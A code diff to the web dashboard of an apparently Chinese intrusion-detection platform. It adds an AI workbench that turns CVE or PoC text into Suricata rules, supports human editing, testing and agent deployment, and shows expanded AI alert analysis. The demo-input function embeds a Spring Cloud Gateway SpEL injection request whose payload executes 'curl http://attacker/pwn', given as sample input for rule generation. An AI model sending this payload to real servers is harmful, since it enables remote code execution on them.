@@ -300,6 +300,43 @@
             color: #f4f8ff;
             border: 1px solid rgba(97,176,255,0.18);
         }
+
+        .ai-progress {
+            display: grid;
+            grid-template-columns: repeat(4, minmax(0, 1fr));
+            gap: 10px;
+        }
+        .ai-step {
+            padding: 14px 16px;
+            border-radius: 18px;
+            border: 1px solid var(--line);
+            background: rgba(255,255,255,0.74);
+        }
+        .ai-step strong { display: block; font-size: 13px; margin-bottom: 6px; }
+        .ai-step span { display: block; font-size: 12px; color: var(--ink-faint); line-height: 1.5; }
+        .ai-step.active {
+            border-color: rgba(15,111,255,0.28);
+            background: linear-gradient(135deg, rgba(15,111,255,0.12), rgba(255,255,255,0.92));
+        }
+        .ai-step.done {
+            border-color: rgba(15,159,116,0.24);
+            background: linear-gradient(135deg, rgba(15,159,116,0.14), rgba(255,255,255,0.92));
+        }
+        .ai-step.error {
+            border-color: rgba(210,61,87,0.24);
+            background: linear-gradient(135deg, rgba(210,61,87,0.14), rgba(255,255,255,0.92));
+        }
+        .ai-rule-editor {
+            min-height: 180px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            background: #f9fbff;
+        }
+        .ai-status-box {
+            min-height: 110px;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
         .sub-actions { display:flex; gap:10px; flex-wrap:wrap; margin-top: 12px; }
 
         .modal {
@@ -639,45 +676,69 @@
 
                 <section class="page" id="ai">
                     <div class="page-header">
-                        <div><h3>AI 联动</h3><p>在同一页完成漏洞语义转规则、规则下发到 Agent，以及对已命中的告警做 AI 分析，适合比赛时直接演示闭环。</p></div>
-                        <div class="toolbar"><button class="btn btn-primary" onclick="loadAIWorkbench()">刷新工作台</button></div>
+                        <div><h3>AI 联动工作台</h3><p>从漏洞描述生成候选 Suricata 规则，支持人工审阅、节点测试和部署落地，并可对已入库告警补充 AI 语义分析。</p></div>
                     </div>
+
+                    <section class="glass-panel">
+                        <div class="panel-header"><div><div class="panel-title">流程进度</div><div class="panel-subtitle">推荐先生成候选规则，再人工修改、测试通过后下发到 Agent</div></div></div>
+                        <div class="ai-progress">
+                            <div class="ai-step active" id="aiStepGenerate"><strong>1. 生成候选规则</strong><span id="aiStepGenerateText">等待输入漏洞信息</span></div>
+                            <div class="ai-step" id="aiStepReview"><strong>2. 人工审阅修改</strong><span id="aiStepReviewText">生成后可直接编辑候选规则</span></div>
+                            <div class="ai-step" id="aiStepTest"><strong>3. 测试规则</strong><span id="aiStepTestText">支持 Master 静态校验或 Agent 动态测试</span></div>
+                            <div class="ai-step" id="aiStepDeploy"><strong>4. 下发部署</strong><span id="aiStepDeployText">测试通过后再部署到目标 Agent</span></div>
+                        </div>
+                    </section>
+
                     <div class="grid-2">
                         <section class="glass-panel">
-                            <div class="panel-header"><div><div class="panel-title">AI 规则生成</div><div class="panel-subtitle">输入 CVE、PoC 或漏洞描述，生成候选 Suricata 规则</div></div></div>
+                            <div class="panel-header"><div><div class="panel-title">AI 规则生成</div><div class="panel-subtitle">输入 CVE、PoC 或漏洞描述，生成候选 Suricata 检测规则</div></div></div>
                             <div class="ai-stack">
                                 <div class="form-grid">
                                     <div><label for="aiSourceType">输入类型</label><select id="aiSourceType"><option value="cve">CVE</option><option value="poc">PoC</option><option value="description">漏洞描述</option></select></div>
                                     <div><label for="aiProtocolHint">协议提示</label><select id="aiProtocolHint"><option value="http">HTTP</option><option value="tcp">TCP</option><option value="dns">DNS</option></select></div>
                                     <div><label for="aiTargetService">目标服务</label><input type="text" id="aiTargetService" placeholder="nginx / tomcat / spring-boot"></div>
-                                    <div><label for="aiSourceContent">漏洞内容</label><textarea id="aiSourceContent" placeholder="输入 CVE 编号、PoC 请求样本或漏洞描述"></textarea></div>
+                                    <div><label for="aiSourceContent">漏洞内容</label><textarea id="aiSourceContent" placeholder="输入 CVE 编号、PoC 代码或漏洞描述，建议提供尽量明确的 HTTP/TCP 语义特征"></textarea></div>
                                 </div>
                                 <div class="sub-actions">
                                     <button class="btn btn-primary" onclick="generateAIRule()">生成候选规则</button>
                                     <button class="btn btn-outline" onclick="fillAIDemoInput()">填充演示样例</button>
                                 </div>
-                                <div id="aiRuleSummary" class="hint-block">尚未生成规则。建议先输入一个 HTTP PoC，例如包含可疑路径、参数名和命令注入特征的请求。</div>
+                                <div id="aiRuleSummary" class="hint-block">建议优先输入 HTTP 场景的 PoC 或漏洞描述，这样更容易生成可验证、可演示的候选规则。</div>
                                 <div id="aiRuleOutput" class="ai-result ai-rule-box">等待 AI 生成候选规则...</div>
+                                <div>
+                                    <label for="aiRuleEditor">人工修订候选规则</label>
+                                    <textarea id="aiRuleEditor" class="ai-rule-editor" placeholder="如果 AI 生成的规则不够稳，可以先在这里人工修改，再重新测试"></textarea>
+                                </div>
+                                <div class="sub-actions">
+                                    <button class="btn btn-outline" onclick="saveAIRuleEdits()">保存人工修改</button>
+                                    <button class="btn btn-outline" onclick="resetAIRuleEditor()">恢复生成结果</button>
+                                </div>
                             </div>
                         </section>
 
                         <section class="glass-panel">
-                            <div class="panel-header"><div><div class="panel-title">规则下发与告警分析</div><div class="panel-subtitle">选择 Agent 下发候选规则，或按告警 ID 生成 AI 安全分析</div></div></div>
+                            <div class="panel-header"><div><div class="panel-title">测试与部署</div><div class="panel-subtitle">载入任务、查看测试状态，并在确认可用后下发到目标 Agent</div></div></div>
                             <div class="ai-stack">
                                 <div class="form-grid">
-                                    <div><label for="aiTaskId">规则任务 ID</label><input type="text" id="aiTaskId" placeholder="生成成功后自动填入"></div>
+                                    <div><label for="aiTaskId">规则任务 ID</label><input type="text" id="aiTaskId" placeholder="生成后会自动填入，也支持手动输入后加载" onkeydown="handleAITaskInput(event)"></div>
                                     <div><label for="aiDeployPath">规则文件路径</label><input type="text" id="aiDeployPath" placeholder="/etc/suricata/rules/dasrs_ai.rules"></div>
-                                    <div><label for="aiAgentIds">目标 Agent ID</label><input type="text" id="aiAgentIds" placeholder="留空则向全部在线 Agent 下发，多个用逗号分隔"></div>
-                                    <div><label for="aiAlertDbId">告警数据库 ID</label><input type="text" id="aiAlertDbId" placeholder="例如告警列表中的数值 ID"></div>
+                                    <div><label for="aiAgentIds">目标 Agent ID</label><input type="text" id="aiAgentIds" placeholder="多个 Agent 用逗号分隔，例如 agent-01,agent-02"></div>
+                                    <div><label for="aiTestMode">测试模式</label><select id="aiTestMode"><option value="agent">Agent 动态测试</option><option value="master">Master 静态校验</option></select></div>
+                                    <div><label for="aiAlertDbId">告警数据库 ID</label><input type="text" id="aiAlertDbId" placeholder="输入告警详情中的数据库 ID，可快速做 AI 告警分析"></div>
                                 </div>
                                 <div class="sub-actions">
-                                    <button class="btn btn-primary" onclick="deployAIRule()">下发规则</button>
+                                    <button class="btn btn-outline" onclick="loadAIRuleTaskFromInput()">载入任务</button>
+                                    <button class="btn btn-primary" onclick="testAIRule()">测试规则</button>
+                                    <button class="btn btn-primary" onclick="deployAIRule()">确认下发</button>
                                     <button class="btn btn-outline" onclick="analyzeAlertFromWorkbench()">分析告警</button>
+                                    <button class="btn btn-outline" onclick="analyzeAlertFromWorkbench(true)">重新研判</button>
                                 </div>
                                 <div class="ai-meta">
-                                    <div id="aiDeployStatus" class="hint-block">规则尚未下发。请先生成规则，再选择 Agent 执行部署。</div>
-                                    <div id="aiAgentsStatus" class="hint-block">正在等待 Agent 信息。此区域会显示当前在线节点，便于你指定下发目标。</div>
+                                    <div id="aiDeployStatus" class="hint-block ai-status-box">这里会显示 AI 服务状态、部署结果和 Agent 回执摘要。</div>
+                                    <div id="aiAgentsStatus" class="hint-block">这里会显示当前在线 Agent，方便选择测试节点和部署目标。</div>
                                 </div>
+                                <div id="aiTestStatus" class="hint-block ai-status-box">这里会显示规则测试结果，包括静态校验信息或 Agent 回传的测试报告。</div>
+                                <div id="aiTaskSnapshot" class="hint-block ai-status-box">这里会显示当前任务的摘要、测试状态和部署进度。</div>
                                 <div id="aiAlertOutput" class="ai-result">等待 AI 告警分析结果...</div>
                             </div>
                         </section>
@@ -1105,33 +1166,166 @@
         async function loadAIWorkbench() {
             const statusRes = await fetchAPI('/api/ai/status');
             if (!statusRes || !statusRes.data) {
-                setText('aiDeployStatus', '无法读取 AI 状态，请确认 Master API 正常运行。');
+                setText('aiDeployStatus', '无法读取 AI 状态，请先确认 Master API 是否正常启动。');
             } else {
                 const status = statusRes.data;
-                const summary = `AI 状态：${status.configuration_status || '-'} | Provider：${status.provider || '-'} | 规则生成：${status.rule_generation ? '可用' : '不可用'} | 告警分析：${status.alert_analysis ? '可用' : '不可用'}`;
+                const summary = `AI 配置：${status.configuration_status || '-'} | Provider：${status.provider || '-'} | 规则生成：${status.rule_generation ? '可用' : '不可用'} | 告警分析：${status.alert_analysis ? '可用' : '不可用'} | Demo Mode：${status.demo_mode ? '开启' : '关闭'}`;
                 setText('aiDeployStatus', summary);
                 if (!status.enabled) {
-                    setText('aiRuleSummary', 'AI 未启用。请先在 configs/config.yaml 中打开 master.ai.enabled 并配置 DeepSeek Key。');
+                    setText('aiRuleSummary', 'AI 尚未启用，请检查 configs/config.yaml 中的 master.ai.enabled 与 DeepSeek 配置。');
+                } else if (status.demo_mode) {
+                    setText('aiRuleSummary', `当前处于 Demo Mode，自动处置阈值已放宽：block=${status.demo_block_threshold || status.block_threshold}, repair=${status.demo_repair_threshold || status.repair_threshold}。`);
                 }
             }
 
             const agentsRes = await fetchAPI('/api/agents?page=1&page_size=100');
             if (!agentsRes || !agentsRes.data || agentsRes.data.length === 0) {
-                setText('aiAgentsStatus', '当前没有可见 Agent。请先确认 Agent 已连接并完成注册。');
-                return;
+                setText('aiAgentsStatus', '当前没有可用 Agent。若要执行动态测试，请先接入至少一个在线 Agent。');
+            } else {
+                const onlineAgents = agentsRes.data.filter(agent => agent.status === 1);
+                const text = onlineAgents.length
+                    ? `在线 Agent：${onlineAgents.map(agent => `${agent.agent_id} (${agent.ip || '-'})`).join('，')}`
+                    : '当前没有在线 Agent，可先使用 Master 静态校验。';
+                setText('aiAgentsStatus', text);
             }
-            const onlineAgents = agentsRes.data.filter(agent => agent.status === 1);
-            const text = onlineAgents.length
-                ? `在线 Agent: ${onlineAgents.map(agent => `${agent.agent_id} (${agent.ip || '-'})`).join(' , ')}`
-                : '当前有 Agent 记录，但没有在线节点。';
-            setText('aiAgentsStatus', text);
+
+            updateAIProgress(lastGeneratedRuleTask);
         }
 
         function fillAIDemoInput() {
             document.getElementById('aiSourceType').value = 'poc';
             document.getElementById('aiProtocolHint').value = 'http';
             document.getElementById('aiTargetService').value = 'spring-boot';
-            document.getElementById('aiSourceContent').value = 'POST /actuator/gateway/routes/test HTTP/1.1\\nHost: demo.local\\nContent-Type: application/json\\n\\n{"id":"test","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{T(java.lang.Runtime).getRuntime().exec(\\"curl http://attacker/pwn\\")}"}}],"uri":"http://example.com"}';
+            document.getElementById('aiSourceContent').value = `POST /actuator/gateway/routes/test HTTP/1.1
+Host: demo.local
+Content-Type: application/json
+
+{"id":"test","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{T(java.lang.Runtime).getRuntime().exec(\"curl http://attacker/pwn\")}"}}],"uri":"http://example.com"}`;
+        }
+
+        function setAIEditor(value) {
+            const editor = document.getElementById('aiRuleEditor');
+            if (editor) editor.value = value || '';
+        }
+
+        function resetAIRuleEditor() {
+            setAIEditor(lastGeneratedRuleTask?.generated_rule || '');
+        }
+
+        function formatAIRuleStatus(status) {
+            switch ((status || '').toLowerCase()) {
+                case 'passed':
+                case 'deployed':
+                case 'tested':
+                case 'ready':
+                    return '已完成';
+                case 'failed':
+                case 'invalid':
+                case 'partial_failed':
+                    return '失败';
+                case 'queued':
+                case 'running':
+                case 'in_progress':
+                case 'partial':
+                    return '进行中';
+                case 'pending':
+                    return '待处理';
+                default:
+                    return status || '未开始';
+            }
+        }
+
+        function updateAIProgress(task) {
+            const ids = ['Generate', 'Review', 'Test', 'Deploy'];
+            ids.forEach(id => {
+                const el = document.getElementById(`aiStep${id}`);
+                if (el) el.className = 'ai-step';
+            });
+
+            setText('aiStepGenerateText', task ? `任务 #${task.id || '-'} | 生成状态：${task.status || '-'}` : '等待输入漏洞信息');
+            setText('aiStepReviewText', task ? '可在下方文本框中人工修订候选规则并保存' : '生成后可直接编辑候选规则');
+            setText('aiStepTestText', task ? `测试状态：${formatAIRuleStatus(task.test_status)}${task.test_message ? ` | ${task.test_message}` : ''}` : '支持 Master 静态校验或 Agent 动态测试');
+            setText('aiStepDeployText', task ? `部署状态：${formatAIRuleStatus(task.deploy_status)}` : '测试通过后再部署到目标 Agent');
+
+            const generate = document.getElementById('aiStepGenerate');
+            const review = document.getElementById('aiStepReview');
+            const test = document.getElementById('aiStepTest');
+            const deploy = document.getElementById('aiStepDeploy');
+
+            if (!task) {
+                if (generate) generate.classList.add('active');
+                return;
+            }
+
+            if (generate) generate.classList.add(task.status === 'failed' || task.status === 'invalid' ? 'error' : 'done');
+            if (review) review.classList.add(task.generated_rule ? 'done' : 'active');
+
+            if (['failed', 'invalid'].includes((task.test_status || '').toLowerCase())) {
+                if (test) test.classList.add('error');
+            } else if (['passed', 'tested'].includes((task.test_status || '').toLowerCase())) {
+                if (test) test.classList.add('done');
+            } else {
+                if (test) test.classList.add('active');
+            }
+
+            if (['failed', 'partial_failed'].includes((task.deploy_status || '').toLowerCase())) {
+                if (deploy) deploy.classList.add('error');
+            } else if (['deployed'].includes((task.deploy_status || '').toLowerCase())) {
+                if (deploy) deploy.classList.add('done');
+            } else if (['queued', 'in_progress', 'partial'].includes((task.deploy_status || '').toLowerCase())) {
+                if (deploy) deploy.classList.add('active');
+            }
+        }
+
+        function renderAITaskSnapshot(task) {
+            if (!task) {
+                setText('aiTaskSnapshot', '当前还没有载入规则任务。生成或输入任务 ID 后，这里会显示任务摘要。');
+                return;
+            }
+
+            setText('aiTaskSnapshot', [
+                `任务 #${task.id || '-'}`,
+                `摘要：${task.normalized_summary || '未生成摘要'}`,
+                `生成状态：${task.status || '-'}`,
+                `测试状态：${formatAIRuleStatus(task.test_status)}${task.test_message ? ` | ${task.test_message}` : ''}`,
+                `部署状态：${formatAIRuleStatus(task.deploy_status)} | 成功 ${task.success_agent_count || 0}/${task.target_agent_count || 0} | 失败 ${task.failed_agent_count || 0}`
+            ].join('\n'));
+        }
+
+        async function loadAIRuleTask(taskId) {
+            if (!taskId) return null;
+            const res = await fetchAPI(`/api/ai/rules/${encodeURIComponent(taskId)}`);
+            if (!res || !res.data) return null;
+            const task = res.data;
+            lastGeneratedRuleTask = task;
+            document.getElementById('aiTaskId').value = task.id || '';
+            setText('aiRuleSummary', `任务 #${task.id} | 生成状态：${task.status || '-'} | 摘要：${task.normalized_summary || '未生成摘要'}`);
+            setText('aiRuleOutput', task.generated_rule || '当前没有候选规则。');
+            setAIEditor(task.generated_rule || '');
+            setText('aiTestStatus', `测试状态：${formatAIRuleStatus(task.test_status)}${task.test_message ? `\n${task.test_message}` : ''}${task.test_report ? `\n\n测试报告：\n${task.test_report}` : ''}`);
+            setText('aiDeployStatus', `部署状态：${formatAIRuleStatus(task.deploy_status)} | 成功 ${task.success_agent_count || 0}/${task.target_agent_count || 0} | 失败 ${task.failed_agent_count || 0}${task.deploy_message ? `\n\n部署回执：\n${task.deploy_message}` : ''}`);
+            renderAITaskSnapshot(task);
+            updateAIProgress(task);
+            return task;
+        }
+
+        async function loadAIRuleTaskFromInput() {
+            const taskId = document.getElementById('aiTaskId').value.trim();
+            if (!taskId) {
+                alert('请输入规则任务 ID。');
+                return;
+            }
+            const task = await loadAIRuleTask(taskId);
+            if (!task) {
+                setText('aiTaskSnapshot', `未找到任务 #${taskId}。`);
+            }
+        }
+
+        function handleAITaskInput(event) {
+            if (event.key === 'Enter') {
+                event.preventDefault();
+                loadAIRuleTaskFromInput();
+            }
         }
 
         async function generateAIRule() {
@@ -1142,29 +1336,84 @@
                 source_content: document.getElementById('aiSourceContent').value.trim()
             };
             if (!payload.source_content) {
-                alert('请先输入漏洞内容。');
+                alert('请输入漏洞描述、PoC 或 CVE 信息。');
                 return;
             }
 
-            setText('aiRuleSummary', '正在请求 DeepSeek 生成候选规则...');
+            setText('aiRuleSummary', '正在调用 DeepSeek 生成候选规则...');
             setText('aiRuleOutput', '生成中...');
             const result = await postAPI('/api/ai/rules/generate', payload);
             if (!isSuccess(result) || !result.data) {
                 setText('aiRuleSummary', `规则生成失败：${result?.message || '未知错误'}`);
-                setText('aiRuleOutput', '未生成到候选规则。');
+                setText('aiRuleOutput', '未能生成候选规则。');
+                renderAITaskSnapshot(null);
+                updateAIProgress(null);
                 return;
             }
 
-            lastGeneratedRuleTask = result.data;
-            document.getElementById('aiTaskId').value = result.data.id || '';
-            setText('aiRuleSummary', `任务 #${result.data.id} 已生成，状态：${result.data.status || '-'}，摘要：${result.data.normalized_summary || '无摘要'}`);
-            setText('aiRuleOutput', result.data.generated_rule || '模型返回了结果，但暂未得到规则文本。');
+            await loadAIRuleTask(result.data.id);
+        }
+
+        async function saveAIRuleEdits() {
+            const taskId = document.getElementById('aiTaskId').value.trim();
+            if (!taskId) {
+                alert('请先载入或生成规则任务 ID。');
+                return;
+            }
+            const generatedRule = document.getElementById('aiRuleEditor').value.trim();
+            if (!generatedRule) {
+                alert('候选规则不能为空。');
+                return;
+            }
+
+            const res = await fetch(`${API_BASE}/api/ai/rules/${encodeURIComponent(taskId)}`, {
+                method: 'PUT',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ generated_rule: generatedRule })
+            });
+            const result = await res.json().catch(() => ({}));
+            if (!res.ok || !result.data) {
+                setText('aiRuleSummary', `保存人工修改失败：${result?.error || '未知错误'}`);
+                return;
+            }
+
+            await loadAIRuleTask(taskId);
+            setText('aiRuleSummary', `任务 #${taskId} 已保存人工修改，请重新测试后再下发。`);
+        }
+
+        async function testAIRule() {
+            const taskId = document.getElementById('aiTaskId').value.trim();
+            if (!taskId) {
+                alert('请先载入或生成规则任务 ID。');
+                return;
+            }
+
+            const mode = document.getElementById('aiTestMode').value;
+            const agentIds = document.getElementById('aiAgentIds').value.split(',').map(value => value.trim()).filter(Boolean);
+            setText('aiTestStatus', mode === 'agent' ? '正在提交 Agent 动态测试...' : '正在执行 Master 静态校验...');
+            const result = await postAPI(`/api/ai/rules/${encodeURIComponent(taskId)}/test`, {
+                mode,
+                agent_ids: agentIds
+            });
+
+            if (!isSuccess(result) || !result.data) {
+                setText('aiTestStatus', `规则测试失败：${result?.message || '未知错误'}`);
+                return;
+            }
+
+            if (mode === 'agent') {
+                setText('aiTestStatus', `已提交到 Agent ${result.agent_id || '-'}，正在等待测试回执...`);
+                pollAIRuleTask(taskId);
+                return;
+            }
+
+            await loadAIRuleTask(taskId);
         }
 
         async function deployAIRule() {
             const taskId = document.getElementById('aiTaskId').value.trim();
             if (!taskId) {
-                alert('请先生成规则或输入任务 ID。');
+                alert('请先载入或生成规则任务 ID。');
                 return;
             }
 
@@ -1172,40 +1421,63 @@
                 config_path: document.getElementById('aiDeployPath').value.trim(),
                 agent_ids: document.getElementById('aiAgentIds').value.split(',').map(value => value.trim()).filter(Boolean)
             };
-            setText('aiDeployStatus', '正在将候选规则加入 Agent 下发队列...');
+            setText('aiDeployStatus', '正在提交部署任务，等待 Agent 回执...');
             const result = await postAPI(`/api/ai/rules/${encodeURIComponent(taskId)}/deploy`, payload);
             if (!isSuccess(result) || !result.data) {
                 setText('aiDeployStatus', `规则下发失败：${result?.message || '未知错误'}`);
                 return;
             }
 
-            const data = result.data;
-            setText('aiDeployStatus', `规则已进入下发队列。任务状态：${data.deploy_status || '-'}。${result.agent_count ? `目标 Agent 数：${result.agent_count}` : ''}`);
+            setText('aiDeployStatus', `部署任务已提交，当前状态：${result.data.deploy_status || '-'}${result.agent_count ? ` | 目标 Agent：${result.agent_count}` : ''}`);
             pollAIRuleTask(taskId);
         }
 
-        async function analyzeAlertFromWorkbench() {
+        async function analyzeAlertFromWorkbench(force = false) {
             const dbId = document.getElementById('aiAlertDbId').value.trim();
             if (!dbId) {
-                alert('请先输入告警数据库 ID。');
+                alert('请输入告警数据库 ID。');
                 return;
             }
 
-            setText('aiAlertOutput', '正在读取告警并生成 AI 分析...');
+            setText('aiAlertOutput', force ? '正在强制重新生成 AI 研判结果...' : '正在读取告警并调用 AI 分析...');
             const alertRes = await fetchAPI(`/api/alerts/${encodeURIComponent(dbId)}`);
             if (!alertRes || !alertRes.data || !alertRes.data.alert_id) {
-                setText('aiAlertOutput', '未能找到该告警，或该记录缺少 alert_id。');
+                setText('aiAlertOutput', '未能读取告警详情，或该告警缺少 alert_id。');
                 return;
             }
 
-            const aiRes = await fetchAPI(`/api/alerts/${encodeURIComponent(alertRes.data.alert_id)}/ai-analysis`);
+            const aiRes = await fetchAPI(`/api/alerts/${encodeURIComponent(alertRes.data.alert_id)}/ai-analysis${force ? '?force=true' : ''}`);
             if (!aiRes || !aiRes.data) {
-                setText('aiAlertOutput', 'AI 告警分析失败。请确认 Master 已启用 AI 并配置 DeepSeek Key。');
+                setText('aiAlertOutput', 'AI 告警分析暂不可用，请检查 Master AI 配置与 DeepSeek Key。');
                 return;
             }
 
             const item = aiRes.data;
-            setText('aiAlertOutput', `摘要：${item.summary || '-'}\n攻击类型：${item.attack_type || '-'}\n建议动作：${formatActionText(item.recommended_action)}\n置信度：${item.confidence ?? '-'}\n\n风险说明：\n${item.risk_reason || '-'}`);
+            setText('aiAlertOutput', `摘要：${item.summary || '-'}
+攻击类型：${item.attack_type || '-'}
+建议动作：${formatActionText(item.recommended_action)}
+置信度：${formatConfidence(item.confidence)}
+
+风险原因：
+${item.risk_reason || '-'}
+
+影响范围：
+${item.impact_scope || '-'}
+
+研判证据：
+${item.evidence_points || '-'}
+
+可疑路径：
+${item.suspicious_path || '-'}
+
+可疑参数：
+${item.suspicious_params || '-'}
+
+命令片段：
+${item.command_fragments || '-'}
+
+处置建议：
+${item.operator_advice || '-'}`);
         }
 
         function openAIAlertAnalysis(id) {
@@ -1215,13 +1487,10 @@
         }
 
         async function pollAIRuleTask(taskId, attempt = 0) {
-            if (!taskId || attempt > 8) return;
-            const res = await fetchAPI(`/api/ai/rules/${encodeURIComponent(taskId)}`);
-            if (!res || !res.data) return;
-            const task = res.data;
-            const message = task.deploy_message || '等待 Agent 回执...';
-            setText('aiDeployStatus', `任务 #${task.id} 下发状态：${task.deploy_status || '-'} | 成功 ${task.success_agent_count || 0}/${task.target_agent_count || 0} | 失败 ${task.failed_agent_count || 0}\n${message}`);
-            if (['queued', 'in_progress', 'partial'].includes(task.deploy_status)) {
+            if (!taskId || attempt > 12) return;
+            const task = await loadAIRuleTask(taskId);
+            if (!task) return;
+            if (['queued', 'in_progress', 'partial'].includes(task.deploy_status) || ['queued', 'running'].includes(task.test_status)) {
                 setTimeout(() => pollAIRuleTask(taskId, attempt + 1), 2000);
             }
         }
@@ -1270,7 +1539,13 @@
                                 <div><strong>攻击类型：</strong>${safeText(aiInsight.attack_type)}</div>
                                 <div><strong>建议动作：</strong><span class="badge info">${formatActionText(aiInsight.recommended_action)}</span></div>
                                 <div><strong>置信度：</strong>${formatConfidence(aiInsight.confidence)}</div>
-                                <div class="hint-block" style="grid-column:1 / -1;">${safeText(aiInsight.risk_reason)}</div>
+                                <div class="hint-block" style="grid-column:1 / -1;"><strong>风险原因：</strong><br>${safeText(aiInsight.risk_reason)}</div>
+                                <div class="hint-block" style="grid-column:1 / -1;"><strong>影响范围：</strong><br>${safeText(aiInsight.impact_scope)}</div>
+                                <div class="hint-block" style="grid-column:1 / -1;"><strong>研判证据：</strong><br>${safeText(aiInsight.evidence_points)}</div>
+                                <div><strong>可疑路径：</strong>${safeText(aiInsight.suspicious_path)}</div>
+                                <div><strong>可疑参数：</strong>${safeText(aiInsight.suspicious_params)}</div>
+                                <div class="hint-block" style="grid-column:1 / -1;"><strong>命令片段：</strong><br>${safeText(aiInsight.command_fragments)}</div>
+                                <div class="hint-block" style="grid-column:1 / -1;"><strong>运维建议：</strong><br>${safeText(aiInsight.operator_advice)}</div>
                             </div>
                         ` : `<div class="hint-block">当前还没有可用的 AI 分析结果。请确认 AI 已启用并配置了 DeepSeek Key。</div>`}
                     </div>
